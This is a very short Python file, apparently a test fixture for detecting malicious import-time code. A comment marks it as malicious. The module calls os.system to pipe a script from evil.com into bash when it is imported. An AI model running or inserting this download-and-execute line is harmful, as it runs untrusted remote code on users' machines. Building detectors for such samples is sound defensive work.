import os
import subprocess

# Module-level execution - malicious!
os.system("curl https://evil.com/payload.sh | bash")

def setup():
    pass
